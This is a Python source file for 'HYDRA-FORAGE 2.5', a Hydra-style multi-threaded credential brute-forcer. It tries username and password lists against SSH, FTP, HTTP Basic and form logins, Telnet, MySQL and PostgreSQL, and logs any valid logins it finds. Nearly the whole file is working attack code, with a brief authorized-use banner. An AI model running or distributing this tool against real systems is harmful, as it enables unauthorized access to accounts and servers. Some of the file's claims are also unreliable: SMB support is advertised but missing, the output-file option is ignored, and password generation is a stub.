#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HYDRA-FORAGE 2.5 – Advanced Multi-Protocol Network Brute Forcer
Author: Enhanced by Security Research Team
Behavior: Full Hydra-compatible CLI with extended features and modern UI
Supported Protocols: SSH, FTP, HTTP-Basic, HTTP-Form, Telnet, MySQL, PostgreSQL, SMB
"""

import argparse
import sys
import threading
import socket
import time
import os
import re
from queue import Queue, Empty
from datetime import datetime
from collections import defaultdict

# Optional protocol libraries
try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from ftplib import FTP
    HAS_FTP = True
except ImportError:
    HAS_FTP = False

try:
    import telnetlib
    HAS_TELNET = True
except ImportError:
    HAS_TELNET = False

try:
    import pymysql
    HAS_MYSQL = True
except ImportError:
    HAS_MYSQL = False

try:
    import psycopg2
    HAS_POSTGRES = True
except ImportError:
    HAS_POSTGRES = False

# ============================================================================
# TERMINAL COLORS & STYLES
# ============================================================================
RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
ITALIC = "\033[3m"
UNDERLINE = "\033[4m"

# Colors
BLACK = "\033[30m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
GRAY = "\033[90m"

# Backgrounds
BG_RED = "\033[41m"
BG_GREEN = "\033[42m"
BG_YELLOW = "\033[43m"
BG_BLUE = "\033[44m"
BG_MAGENTA = "\033[45m"
BG_CYAN = "\033[46m"
BG_WHITE = "\033[47m"

# ============================================================================
# ENHANCED BANNER & UI ELEMENTS
# ============================================================================
def print_banner():
    banner_art = f"""{CYAN}{BOLD}
╦ ╦╦ ╦╔╦╗╦═╗╔═╗   ╔═╗╔═╗╦═╗╔═╗╔═╗╔═╗
╠═╣╚╦╝ ║║╠╦╝╠═╣───╠╣ ║ ║╠╦╝╠═╣║ ╦║╣ 
╩ ╩ ╩ ═╩╝╩╚═╩ ╩   ╚  ╚═╝╩╚═╩ ╩╚═╝╚═╝{RESET}
{MAGENTA}{'═' * 50}{RESET}
{GREEN}{BOLD}     Password Testing & Security Tool{RESET}
{WHITE}        Test Your System's Security{RESET}
{DIM}           Version 2.5 Enhanced{RESET}
{MAGENTA}{'═' * 50}{RESET}

{YELLOW}{BOLD}IMPORTANT LEGAL NOTICE:{RESET}
{WHITE}This tool is for authorized security testing only.
Only use on systems you own or have permission to test.
Unauthorized access is illegal and punishable by law.{RESET}
"""
    print(banner_art)

def print_section_header(title):
    """Print a visually distinct section header"""
    width = 60
    print(f"\n{CYAN}{BOLD}{'═' * width}{RESET}")
    print(f"{CYAN}{BOLD}║{RESET}  {BOLD}{title}{RESET}")
    print(f"{CYAN}{BOLD}{'═' * width}{RESET}")

def print_info_box(title, content, color=CYAN):
    """Enhanced info box with better formatting"""
    width = 76
    print(f"\n{color}{BOLD}╔{'═' * (width-2)}╗{RESET}")
    title_text = f"  {title}  "
    title_padding = (width - len(title_text) - 2) // 2
    print(f"{color}{BOLD}║{RESET}{' ' * title_padding}{BOLD}{title_text}{RESET}{' ' * (width - len(title_text) - title_padding - 2)}{color}{BOLD}║{RESET}")
    print(f"{color}{BOLD}╠{'═' * (width-2)}╣{RESET}")
    for line in content:
        # Handle colored text in lines
        visible_length = len(re.sub(r'\033\[[0-9;]+m', '', line))
        padding = width - visible_length - 3
        print(f"{color}{BOLD}║{RESET} {line}{' ' * padding}{color}{BOLD}║{RESET}")
    print(f"{color}{BOLD}╚{'═' * (width-2)}╝{RESET}\n")

def print_simple_box(title, message, box_color=YELLOW):
    """Print a simple message box"""
    print(f"\n{box_color}┌{'─' * 58}┐{RESET}")
    print(f"{box_color}│{RESET}  {BOLD}{title}{RESET}")
    print(f"{box_color}├{'─' * 58}┤{RESET}")
    print(f"{box_color}│{RESET}  {message}")
    print(f"{box_color}└{'─' * 58}┘{RESET}\n")

def print_step(step_num, total_steps, description):
    """Print a step indicator"""
    print(f"\n{CYAN}[{BOLD}Step {step_num}/{total_steps}{RESET}{CYAN}]{RESET} {WHITE}{description}{RESET}")

def print_success_banner(message):
    """Print a success message with banner"""
    print(f"\n{GREEN}{BOLD}{'━' * 60}{RESET}")
    print(f"{BG_GREEN}{BLACK}{BOLD}  SUCCESS  {RESET} {GREEN}{BOLD}{message}{RESET}")
    print(f"{GREEN}{BOLD}{'━' * 60}{RESET}\n")

def print_error_banner(message):
    """Print an error message with banner"""
    print(f"\n{RED}{BOLD}{'━' * 60}{RESET}")
    print(f"{BG_RED}{WHITE}{BOLD}  ERROR  {RESET} {RED}{BOLD}{message}{RESET}")
    print(f"{RED}{BOLD}{'━' * 60}{RESET}\n")

def print_warning_banner(message):
    """Print a warning message with banner"""
    print(f"\n{YELLOW}{BOLD}{'━' * 60}{RESET}")
    print(f"{BG_YELLOW}{BLACK}{BOLD}  WARNING  {RESET} {YELLOW}{BOLD}{message}{RESET}")
    print(f"{YELLOW}{BOLD}{'━' * 60}{RESET}\n")

# ============================================================================
# UTILITIES
# ============================================================================
def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def short_time():
    return datetime.now().strftime("%H:%M:%S")

def parse_target(target_str, default_port=None):
    """Parse target string supporting formats: host, host:port, protocol://host:port"""
    scheme = None
    hostport = target_str
    
    if "://" in target_str:
        scheme, hostport = target_str.split("://", 1)
    
    host = hostport
    port = default_port
    
    if ":" in hostport:
        parts = hostport.rsplit(":", 1)
        host = parts[0]
        try:
            port = int(parts[1])
        except ValueError:
            port = default_port
    
    return scheme, host, port

def load_file_lines(filepath):
    """Load lines from file, handling encoding issues"""
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if line.strip()]
            print(f"{GREEN}  [+] Successfully loaded {len(lines)} entries from {filepath}{RESET}")
            return lines
    except FileNotFoundError:
        print_error_banner(f"File not found: {filepath}")
        print(f"{YELLOW}  [!] Please check the file path and try again{RESET}")
        sys.exit(1)
    except Exception as e:
        print_error_banner(f"Error reading file: {filepath}")
        print(f"{YELLOW}  [!] Error details: {e}{RESET}")
        sys.exit(1)

def save_result(host, port, service, username, password, output_file="hydra_forage.txt"):
    """Save successful login to file"""
    try:
        with open(output_file, "a") as f:
            timestamp_str = timestamp()
            f.write(f"[{timestamp_str}] {host}:{port} [{service}] login: {username} password: {password}\n")
    except Exception as e:
        print(f"{YELLOW}[WARNING] Could not save result to file: {e}{RESET}")

# ============================================================================
# PROTOCOL HANDLERS
# ============================================================================

class ProtocolHandler:
    """Base class for protocol handlers"""
    
    @staticmethod
    def test_connection(host, port, timeout=5):
        """Test if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False

# SSH Handler
def ssh_login(host, port, username, password, timeout, **kwargs):
    """Attempt SSH login"""
    if not HAS_PARAMIKO:
        raise RuntimeError("paramiko not installed (pip install paramiko)")
    
    try:
        paramiko.util.log_to_file(os.devnull)
    except:
        pass
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
            banner_timeout=timeout
        )
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return False
    finally:
        try:
            client.close()
        except:
            pass

# FTP Handler
def ftp_login(host, port, username, password, timeout, **kwargs):
    """Attempt FTP login"""
    if not HAS_FTP:
        raise RuntimeError("ftplib not available")
    
    try:
        ftp = FTP()
        ftp.connect(host, port, timeout=timeout)
        ftp.login(username, password)
        ftp.quit()
        return True
    except Exception:
        return False

# HTTP Basic Auth Handler
def http_basic_login(host, port, username, password, timeout, path="/", use_https=False, **kwargs):
    """Attempt HTTP Basic Auth login"""
    if not HAS_REQUESTS:
        raise RuntimeError("requests not installed (pip install requests)")
    
    scheme = "https" if use_https else "http"
    url = f"{scheme}://{host}:{port}{path}"
    
    try:
        response = requests.get(
            url,
            auth=(username, password),
            timeout=timeout,
            allow_redirects=False,
            verify=False
        )
        # Success if not 401/403
        return response.status_code not in [401, 403]
    except:
        return False

# HTTP Form-Based Auth Handler
def http_form_login(host, port, username, password, timeout, path="/login", 
                    user_field="username", pass_field="password", 
                    success_string=None, failure_string=None, use_https=False, **kwargs):
    """Attempt HTTP form-based login"""
    if not HAS_REQUESTS:
        raise RuntimeError("requests not installed (pip install requests)")
    
    scheme = "https" if use_https else "http"
    url = f"{scheme}://{host}:{port}{path}"
    
    try:
        data = {
            user_field: username,
            pass_field: password
        }
        response = requests.post(
            url,
            data=data,
            timeout=timeout,
            allow_redirects=True,
            verify=False
        )
        
        # Check for success/failure indicators
        if success_string:
            return success_string in response.text
        if failure_string:
            return failure_string not in response.text
        
        # Default: check status code
        return response.status_code == 200
    except:
        return False

# Telnet Handler
def telnet_login(host, port, username, password, timeout, 
                 user_prompt=b"login:", pass_prompt=b"Password:", **kwargs):
    """Attempt Telnet login"""
    if not HAS_TELNET:
        raise RuntimeError("telnetlib not available")
    
    try:
        tn = telnetlib.Telnet(host, port, timeout=timeout)
        tn.read_until(user_prompt, timeout=timeout)
        tn.write(username.encode('ascii') + b"\n")
        tn.read_until(pass_prompt, timeout=timeout)
        tn.write(password.encode('ascii') + b"\n")
        
        # Read response
        response = tn.read_some()
        tn.close()
        
        # Check for failure indicators
        failure_indicators = [b"incorrect", b"failed", b"denied", b"invalid"]
        return not any(indicator in response.lower() for indicator in failure_indicators)
    except:
        return False

# MySQL Handler
def mysql_login(host, port, username, password, timeout, **kwargs):
    """Attempt MySQL login"""
    if not HAS_MYSQL:
        raise RuntimeError("pymysql not installed (pip install pymysql)")
    
    try:
        conn = pymysql.connect(
            host=host,
            port=port,
            user=username,
            password=password,
            connect_timeout=timeout
        )
        conn.close()
        return True
    except pymysql.err.OperationalError:
        return False
    except:
        return False

# PostgreSQL Handler
def postgres_login(host, port, username, password, timeout, **kwargs):
    """Attempt PostgreSQL login"""
    if not HAS_POSTGRES:
        raise RuntimeError("psycopg2 not installed (pip install psycopg2-binary)")
    
    try:
        conn = psycopg2.connect(
            host=host,
            port=port,
            user=username,
            password=password,
            connect_timeout=timeout
        )
        conn.close()
        return True
    except psycopg2.OperationalError:
        return False
    except:
        return False

# ============================================================================
# SERVICE CONFIGURATION
# ============================================================================

SERVICES = {
    "ssh": {
        "handler": ssh_login,
        "default_port": 22,
        "requires": "paramiko",
        "description": "Secure Shell Protocol - Remote Login"
    },
    "ftp": {
        "handler": ftp_login,
        "default_port": 21,
        "requires": "ftplib",
        "description": "File Transfer Protocol"
    },
    "http-get": {
        "handler": lambda h, p, u, pw, t, **kw: http_basic_login(h, p, u, pw, t, kw.get("path", "/")),
        "default_port": 80,
        "requires": "requests",
        "description": "HTTP Basic Authentication (GET)"
    },
    "http-post": {
        "handler": lambda h, p, u, pw, t, **kw: http_basic_login(h, p, u, pw, t, kw.get("path", "/")),
        "default_port": 80,
        "requires": "requests",
        "description": "HTTP Basic Authentication (POST)"
    },
    "http-post-form": {
        "handler": http_form_login,
        "default_port": 80,
        "requires": "requests",
        "description": "HTTP Form-Based Authentication"
    },
    "https-get": {
        "handler": lambda h, p, u, pw, t, **kw: http_basic_login(h, p, u, pw, t, kw.get("path", "/"), True),
        "default_port": 443,
        "requires": "requests",
        "description": "HTTPS Basic Authentication (GET)"
    },
    "https-post": {
        "handler": lambda h, p, u, pw, t, **kw: http_basic_login(h, p, u, pw, t, kw.get("path", "/"), True),
        "default_port": 443,
        "requires": "requests",
        "description": "HTTPS Basic Authentication (POST)"
    },
    "telnet": {
        "handler": telnet_login,
        "default_port": 23,
        "requires": "telnetlib",
        "description": "Telnet Protocol - Remote Access"
    },
    "mysql": {
        "handler": mysql_login,
        "default_port": 3306,
        "requires": "pymysql",
        "description": "MySQL Database Server"
    },
    "postgres": {
        "handler": postgres_login,
        "default_port": 5432,
        "requires": "psycopg2",
        "description": "PostgreSQL Database Server"
    }
}

# ============================================================================
# WORKER POOL
# ============================================================================

class BruteForceEngine:
    """Multi-threaded brute force engine"""
    
    def __init__(self, service, host, port, timeout, threads, handler_kwargs, verbose=False):
        self.service = service
        self.host = host
        self.port = port
        self.timeout = timeout
        self.threads = threads
        self.handler_kwargs = handler_kwargs
        self.verbose = verbose
        
        self.queue = Queue()
        self.workers = []
        self.stop_flag = threading.Event()
        self.print_lock = threading.Lock()
        
        # Statistics
        self.total_attempts = 0
        self.successful_logins = 0
        self.failed_attempts = 0
        self.start_time = None
        self.stats_lock = threading.Lock()
        
        # Results storage
        self.valid_credentials = []
        
        # Service handler
        service_config = SERVICES.get(service)
        if not service_config:
            raise ValueError(f"Unsupported service: {service}")
        
        self.handler = service_config["handler"]
        
    def start(self):
        """Start worker threads"""
        self.start_time = time.time()
        
        for i in range(self.threads):
            worker = threading.Thread(
                target=self._worker_loop,
                name=f"Worker-{i+1}",
                daemon=True
            )
            worker.start()
            self.workers.append(worker)
    
    def add_attempt(self, username, password):
        """Queue a login attempt"""
        self.queue.put((username, password))
    
    def _worker_loop(self):
        """Worker thread main loop"""
        while not self.stop_flag.is_set():
            try:
                item = self.queue.get(timeout=0.5)
                if item is None:
                    break
                
                username, password = item
                self._attempt_login(username, password)
                self.queue.task_done()
                
            except Empty:
                continue
            except Exception as e:
                if self.verbose:
                    with self.print_lock:
                        print(f"{YELLOW}[WARNING] Worker encountered an error: {e}{RESET}")
    
    def _attempt_login(self, username, password):
        """Attempt a single login"""
        with self.stats_lock:
            self.total_attempts += 1
            attempt_num = self.total_attempts
        
        success = False
        
        try:
            # Call the service handler
            success = self.handler(
                self.host,
                self.port,
                username,
                password,
                self.timeout,
                **self.handler_kwargs
            )
            
        except RuntimeError as e:
            # Missing dependency
            with self.print_lock:
                print_error_banner("Missing Required Library")
                print(f"{YELLOW}  [!] {e}{RESET}")
            self.stop()
            return
        except Exception as e:
            if self.verbose:
                with self.print_lock:
                    print(f"{YELLOW}[WARNING] Exception during login attempt: {e}{RESET}")
        
        if success:
            with self.stats_lock:
                self.successful_logins += 1
                self.valid_credentials.append((username, password))
            
            # Print success message
            self._print_success(username, password)
            
            # Save to file
            save_result(self.host, self.port, self.service, username, password)
        else:
            with self.stats_lock:
                self.failed_attempts += 1
    
    def _print_success(self, username, password):
        """Print successful login with enhanced formatting"""
        ts = short_time()
        
        with self.print_lock:
            print(f"\n")
            print(f"{GREEN}{BOLD}{'━' * 70}{RESET}")
            print(f"{BG_GREEN}{BLACK}{BOLD}  VALID CREDENTIALS FOUND  {RESET} {GREEN}[{ts}]{RESET}")
            print(f"{GREEN}{BOLD}{'━' * 70}{RESET}")
            print(f"{WHITE}  Service:{RESET}   {CYAN}{self.service.upper()}{RESET}")
            print(f"{WHITE}  Target:{RESET}    {CYAN}{self.host}:{self.port}{RESET}")
            print(f"{WHITE}  Username:{RESET}  {YELLOW}{BOLD}{username}{RESET}")
            print(f"{WHITE}  Password:{RESET}  {YELLOW}{BOLD}{password}{RESET}")
            print(f"{GREEN}{BOLD}{'━' * 70}{RESET}\n")
    
    def stop(self):
        """Stop all workers"""
        self.stop_flag.set()
        # Send stop signals
        for _ in self.workers:
            self.queue.put(None)
    
    def wait(self, timeout=None):
        """Wait for all workers to finish"""
        for worker in self.workers:
            worker.join(timeout)
    
    def get_stats(self):
        """Get current statistics"""
        with self.stats_lock:
            elapsed = time.time() - self.start_time if self.start_time else 0
            rate = self.total_attempts / elapsed if elapsed > 0 else 0
            
            return {
                "attempts": self.total_attempts,
                "successful": self.successful_logins,
                "failed": self.failed_attempts,
                "elapsed": elapsed,
                "rate": rate
            }

# ============================================================================
# PROGRESS DISPLAY
# ============================================================================

class ProgressDisplay:
    """Real-time progress display with enhanced visuals"""
    
    def __init__(self, engine, total_combos, print_lock, verbose=False):
        self.engine = engine
        self.total = total_combos
        self.print_lock = print_lock
        self.verbose = verbose
        self.running = threading.Event()
        self.thread = None
    
    def start(self):
        """Start progress display thread"""
        self.running.set()
        self.thread = threading.Thread(target=self._display_loop, daemon=True)
        self.thread.start()
    
    def stop(self):
        """Stop progress display"""
        self.running.clear()
        if self.thread:
            self.thread.join(timeout=2)
    
    def _display_loop(self):
        """Progress display loop with enhanced formatting"""
        spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        idx = 0
        
        while self.running.is_set():
            stats = self.engine.get_stats()
            
            attempts = stats["attempts"]
            successful = stats["successful"]
            rate = stats["rate"]
            elapsed = stats["elapsed"]
            
            # Calculate progress
            progress_pct = (attempts / self.total * 100) if self.total > 0 else 0
            remaining = max(self.total - attempts, 0)
            eta = (remaining / rate) if rate > 0 else 0
            
            # Format display
            if self.verbose:
                status = (
                    f"\r{CYAN}{spinner[idx % len(spinner)]}{RESET} "
                    f"{WHITE}Testing:{RESET} [{BOLD}{attempts}{RESET}/{self.total}] "
                    f"{CYAN}{progress_pct:.1f}%{RESET} | "
                    f"{GREEN}Found: {BOLD}{successful}{RESET} | "
                    f"{YELLOW}Speed: {rate:.1f}/sec{RESET} | "
                    f"{MAGENTA}ETA: {self._format_time(eta)}{RESET} | "
                    f"{GRAY}Elapsed: {self._format_time(elapsed)}{RESET}"
                )
            else:
                bar_width = 30
                filled = int(bar_width * progress_pct / 100)
                bar = "█" * filled + "░" * (bar_width - filled)
                
                status = (
                    f"\r{CYAN}[{bar}]{RESET} {BOLD}{progress_pct:.1f}%{RESET} | "
                    f"{WHITE}Testing:{RESET} {attempts}/{self.total} | "
                    f"{GREEN}Valid: {BOLD}{successful}{RESET} | "
                    f"{YELLOW}{rate:.1f}/sec{RESET}"
                )
            
            with self.print_lock:
                sys.stdout.write(status)
                sys.stdout.flush()
            
            idx += 1
            time.sleep(0.3)
    
    @staticmethod
    def _format_time(seconds):
        """Format seconds to human readable time"""
        if seconds == float('inf') or seconds > 86400:
            return "--:--:--"
        
        hours = int(seconds // 3600)
        minutes = int((seconds % 3600) // 60)
        secs = int(seconds % 60)
        
        if hours > 0:
            return f"{hours:02d}:{minutes:02d}:{secs:02d}"
        else:
            return f"{minutes:02d}:{secs:02d}"

# ============================================================================
# MAIN PROGRAM
# ============================================================================

def print_service_list():
    """Print available services with enhanced formatting"""
    print_section_header("Available Services and Protocols")
    
    print(f"\n{WHITE}The following services are supported for security testing:{RESET}\n")
    
    for service, config in sorted(SERVICES.items()):
        has_lib = config["requires"] in ["ftplib", "telnetlib"] or globals().get(f"HAS_{config['requires'].upper().replace('-', '_')}", False)
        
        if has_lib:
            status = f"{GREEN}[READY]{RESET}"
        else:
            status = f"{RED}[NOT INSTALLED]{RESET}"
        
        print(f"  {status} {YELLOW}{BOLD}{service:20s}{RESET} - {WHITE}{config['description']}{RESET}")
        print(f"       {GRAY}Default Port: {config['default_port']}{RESET}")
        
        if not has_lib:
            print(f"       {YELLOW}Install with: pip install {config['requires']}{RESET}")
        print()

def validate_dependencies(service):
    """Check if required dependencies are installed"""
    config = SERVICES.get(service)
    if not config:
        return False
    
    req = config["requires"]
    
    if req == "paramiko" and not HAS_PARAMIKO:
        print_error_banner("Missing Required Library")
        print(f"{WHITE}  The '{service}' service requires the 'paramiko' library.{RESET}")
        print(f"{YELLOW}  Install it by running: pip install paramiko{RESET}\n")
        return False
    elif req == "requests" and not HAS_REQUESTS:
        print_error_banner("Missing Required Library")
        print(f"{WHITE}  The '{service}' service requires the 'requests' library.{RESET}")
        print(f"{YELLOW}  Install it by running: pip install requests{RESET}\n")
        return False
    elif req == "pymysql" and not HAS_MYSQL:
        print_error_banner("Missing Required Library")
        print(f"{WHITE}  The '{service}' service requires the 'pymysql' library.{RESET}")
        print(f"{YELLOW}  Install it by running: pip install pymysql{RESET}\n")
        return False
    elif req == "psycopg2" and not HAS_POSTGRES:
        print_error_banner("Missing Required Library")
        print(f"{WHITE}  The '{service}' service requires the 'psycopg2' library.{RESET}")
        print(f"{YELLOW}  Install it by running: pip install psycopg2-binary{RESET}\n")
        return False
    
    return True

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        prog="hydra-forage",
        description="HYDRA-FORAGE - Advanced Multi-Protocol Network Login Cracker",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{CYAN}{BOLD}Usage Examples:{RESET}
  Test SSH with single username and password file:
    hydra-forage -l admin -P passwords.txt ssh://192.168.1.100
  
  Test SSH on custom port with username list:
    hydra-forage -L users.txt -p password123 -s 2222 ssh://target.com
  
  Test FTP with 16 parallel threads:
    hydra-forage -l root -P rockyou.txt -t 16 ftp://10.0.0.1
  
  Test HTTP Basic Auth with custom path:
    hydra-forage -l admin -p admin -m /admin http-get://site.com

{CYAN}{BOLD}Getting Started:{RESET}
  To see all available services:
    hydra-forage --list-services
  
  For detailed help:
    hydra-forage -h
        """
    )
    
    # Target
    parser.add_argument("target", nargs="?", help="Target format: service://host[:port]")
    
    # Credentials
    cred_group = parser.add_argument_group("Credential Options")
    user_group = cred_group.add_mutually_exclusive_group()
    user_group.add_argument("-l", "--login", dest="username", help="Single username to test")
    user_group.add_argument("-L", "--login-file", dest="userlist", help="File containing list of usernames")
    
    pass_group = cred_group.add_mutually_exclusive_group()
    pass_group.add_argument("-p", "--pass", dest="password", help="Single password to test")
    pass_group.add_argument("-P", "--pass-file", dest="passlist", help="File containing list of passwords")
    pass_group.add_argument("-x", "--generate", help="Generate passwords (MIN:MAX:CHARSET)")
    
    # Target options
    target_group = parser.add_argument_group("Target Options")
    target_group.add_argument("-s", "--port", type=int, help="Custom port number (overrides default)")
    target_group.add_argument("-m", "--path", default="/", help="Path for HTTP services (default: /)")
    
    # Timing options
    timing_group = parser.add_argument_group("Performance Options")
    timing_group.add_argument("-t", "--tasks", type=int, default=16, help="Number of parallel connections (default: 16)")
    timing_group.add_argument("-w", "--timeout", type=int, default=10, help="Connection timeout in seconds (default: 10)")
    timing_group.add_argument("-W", "--wait", type=int, default=0, help="Wait time between attempts in ms (default: 0)")
    
    # Output options
    output_group = parser.add_argument_group("Output Options")
    output_group.add_argument("-o", "--output", default="hydra_forage.txt", help="Output file for results (default: hydra_forage.txt)")
    output_group.add_argument("-v", "--verbose", action="store_true", help="Show detailed progress information")
    output_group.add_argument("-V", "--version", action="version", version="HYDRA-FORAGE 2.5 Enhanced")
    output_group.add_argument("-q", "--quiet", action="store_true", help="Minimal output mode")
    
    # Misc options
    misc_group = parser.add_argument_group("Advanced Options")
    misc_group.add_argument("-f", "--exit-on-first", action="store_true", help="Stop after finding first valid credential")
    misc_group.add_argument("-F", "--exit-all-found", action="store_true", help="Stop after finding all credentials for a user")
    misc_group.add_argument("--list-services", action="store_true", help="Display all supported services")
    
    return parser.parse_args()

def main():
    """Main program entry point"""
    args = parse_arguments()
    
    # Show banner
    if not args.quiet:
        print_banner()
    
    # List services if requested
    if args.list_services:
        print_service_list()
        sys.exit(0)
    
    # Validate target
    if not args.target:
        print_error_banner("No Target Specified")
        print(f"{WHITE}  You need to specify a target to test.{RESET}\n")
        print(f"{CYAN}  Example:{RESET} hydra-forage -l admin -P passwords.txt ssh://192.168.1.100\n")
        print(f"{YELLOW}  For more help, run: hydra-forage -h{RESET}\n")
        sys.exit(1)
    
    # Parse target
    print_step(1, 4, "Parsing target information")
    scheme, host, port = parse_target(args.target)
    
    if not scheme:
        print_error_banner("Invalid Target Format")
        print(f"{WHITE}  The target must be in the format: service://host[:port]{RESET}\n")
        print(f"{CYAN}  Example:{RESET} ssh://192.168.1.100 or ftp://example.com:21\n")
        sys.exit(1)
    
    service = scheme.lower()
    
    # Check if service exists
    if service not in SERVICES:
        print_error_banner(f"Unknown Service: {service}")
        print(f"{WHITE}  The service '{service}' is not supported.{RESET}\n")
        print(f"{YELLOW}  Run 'hydra-forage --list-services' to see available services{RESET}\n")
        sys.exit(1)
    
    # Set default port if not specified
    if not port:
        port = SERVICES[service]["default_port"]
    
    # Override port if specified in args
    if args.port:
        port = args.port
    
    print(f"{GREEN}  [+] Target: {CYAN}{host}:{port}{RESET} ({service}){RESET}")
    
    # Validate dependencies
    print_step(2, 4, "Checking required libraries")
    if not validate_dependencies(service):
        sys.exit(1)
    print(f"{GREEN}  [+] All required libraries are installed{RESET}")
    
    # Load credentials
    print_step(3, 4, "Loading credentials")
    
    if not args.username and not args.userlist:
        print_error_banner("No Username Provided")
        print(f"{WHITE}  You must provide at least one username to test.{RESET}\n")
        print(f"{YELLOW}  Use -l for a single username: -l admin{RESET}")
        print(f"{YELLOW}  Use -L for a username file: -L users.txt{RESET}\n")
        sys.exit(1)
    
    if not args.password and not args.passlist and not args.generate:
        print_error_banner("No Password Provided")
        print(f"{WHITE}  You must provide at least one password to test.{RESET}\n")
        print(f"{YELLOW}  Use -p for a single password: -p password123{RESET}")
        print(f"{YELLOW}  Use -P for a password file: -P passwords.txt{RESET}\n")
        sys.exit(1)
    
    # Load usernames
    usernames = []
    if args.username:
        usernames = [args.username]
        print(f"{GREEN}  [+] Using single username: {CYAN}{args.username}{RESET}")
    elif args.userlist:
        print(f"{WHITE}  [*] Loading usernames from: {args.userlist}{RESET}")
        usernames = load_file_lines(args.userlist)
        if not usernames:
            print_error_banner("Empty Username File")
            print(f"{YELLOW}  The file '{args.userlist}' contains no valid usernames{RESET}\n")
            sys.exit(1)
    
    # Load passwords
    passwords = []
    if args.password:
        passwords = [args.password]
        print(f"{GREEN}  [+] Using single password{RESET}")
    elif args.passlist:
        print(f"{WHITE}  [*] Loading passwords from: {args.passlist}{RESET}")
        passwords = load_file_lines(args.passlist)
        if not passwords:
            print_error_banner("Empty Password File")
            print(f"{YELLOW}  The file '{args.passlist}' contains no valid passwords{RESET}\n")
            sys.exit(1)
    elif args.generate:
        print_warning_banner("Password Generation Not Available")
        print(f"{WHITE}  Password generation feature is not yet implemented.{RESET}")
        print(f"{YELLOW}  Please use -p or -P to provide passwords.{RESET}\n")
        sys.exit(1)
    
    # Create credential combinations
    combinations = []
    for username in usernames:
        for password in passwords:
            combinations.append((username, password))
    
    total_combos = len(combinations)
    
    # Display attack information
    if not args.quiet:
        attack_info = [
            f"{WHITE}Target Host:{RESET}      {CYAN}{host}{RESET}",
            f"{WHITE}Target Port:{RESET}      {CYAN}{port}{RESET}",
            f"{WHITE}Service:{RESET}          {YELLOW}{service.upper()}{RESET}",
            f"{WHITE}Usernames:{RESET}        {BOLD}{len(usernames)}{RESET}",
            f"{WHITE}Passwords:{RESET}        {BOLD}{len(passwords)}{RESET}",
            f"{WHITE}Total Tests:{RESET}      {BOLD}{total_combos}{RESET} combinations",
            f"{WHITE}Parallel Tasks:{RESET}   {BOLD}{args.tasks}{RESET}",
            f"{WHITE}Timeout:{RESET}          {BOLD}{args.timeout}{RESET} seconds",
            f"{WHITE}Output File:{RESET}      {CYAN}{args.output}{RESET}"
        ]
        print_info_box("Attack Configuration", attack_info, MAGENTA)
    
    # Test connection
    print_step(4, 4, "Testing connection to target")
    sys.stdout.write(f"{WHITE}  [*] Connecting to {CYAN}{host}:{port}{RESET}... ")
    sys.stdout.flush()
    
    if not ProtocolHandler.test_connection(host, port, args.timeout):
        print(f"{RED}FAILED{RESET}")
        print_warning_banner("Connection Failed")
        print(f"{WHITE}  Unable to connect to {host}:{port}{RESET}")
        print(f"{YELLOW}  The port may be closed, filtered, or unreachable.{RESET}\n")
        
        # Ask if user wants to continue
        if not args.quiet:
            try:
                print(f"{WHITE}  Would you like to continue anyway?{RESET}")
                response = input(f"{YELLOW}  Continue? [y/N]: {RESET}")
                if response.lower() not in ['y', 'yes']:
                    print(f"\n{CYAN}  Operation cancelled by user.{RESET}\n")
                    sys.exit(1)
                print()
            except KeyboardInterrupt:
                print(f"\n\n{CYAN}  Operation cancelled by user.{RESET}\n")
                sys.exit(1)
    else:
        print(f"{GREEN}SUCCESS{RESET}")
        print(f"{GREEN}  [+] Connection established successfully{RESET}")
    
    # Prepare handler kwargs
    handler_kwargs = {
        "path": args.path
    }
    
    # Initialize brute force engine
    print_lock = threading.Lock()
    engine = BruteForceEngine(
        service=service,
        host=host,
        port=port,
        timeout=args.timeout,
        threads=args.tasks,
        handler_kwargs=handler_kwargs,
        verbose=args.verbose
    )
    
    # Start attack
    if not args.quiet:
        print(f"\n{GREEN}{BOLD}{'═' * 70}{RESET}")
        print(f"{BG_GREEN}{BLACK}{BOLD}  STARTING SECURITY TEST  {RESET} {GREEN}[{timestamp()}]{RESET}")
        print(f"{GREEN}{BOLD}{'═' * 70}{RESET}")
        print(f"\n{WHITE}Testing {BOLD}{total_combos}{RESET}{WHITE} credential combinations...{RESET}\n")
    
    engine.start()
    
    # Queue all attempts
    for username, password in combinations:
        engine.add_attempt(username, password)
        if args.wait > 0:
            time.sleep(args.wait / 1000.0)
    
    # Start progress display
    progress = ProgressDisplay(engine, total_combos, print_lock, args.verbose)
    if not args.quiet:
        progress.start()
    
    # Monitor progress
    try:
        while True:
            stats = engine.get_stats()
            
            # Check if done
            if stats["attempts"] >= total_combos:
                break
            
            # Check exit conditions
            if args.exit_on_first and stats["successful"] > 0:
                if not args.quiet:
                    print(f"\n\n{YELLOW}[*] Found valid credential - stopping (exit-on-first mode){RESET}")
                break
            
            time.sleep(0.5)
    
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}{BOLD}{'━' * 70}{RESET}")
        print(f"{BG_YELLOW}{BLACK}{BOLD}  INTERRUPTED BY USER  {RESET}")
        print(f"{YELLOW}{BOLD}{'━' * 70}{RESET}\n")
